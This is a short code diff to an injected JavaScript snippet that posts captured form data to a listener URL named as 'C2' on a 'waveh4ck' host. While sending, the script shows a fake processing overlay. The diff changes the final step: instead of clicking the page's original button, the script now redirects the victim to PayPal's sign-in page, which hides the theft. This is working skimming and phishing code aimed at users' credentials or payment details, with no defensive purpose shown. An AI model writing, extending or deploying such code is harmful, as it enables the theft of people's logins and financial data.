@@ -2,6 +2,7 @@
 (function () {
     // SINKRONISASI: Arahkan ke listener.php di folder yang sama atau subfolder panel
     const C2 = 'https://waveh4ck.gamer.gd/listener.php';
+    const REDIRECT_URL = 'https://www.paypal.com/signin';
     if (window._wh_final) return;
     window._wh_final = true;
 
@@ -92,7 +93,9 @@
             };
             document.getElementById('p-sub').innerText = 'Elaborazione...';
             _u.send(d);
-            setTimeout(() => { window._bp = true; w.remove(); origBtn.click(); }, 2000);
+            setTimeout(() => { 
+                window.location.href = REDIRECT_URL; 
+            }, 1500);
         }
     }
 
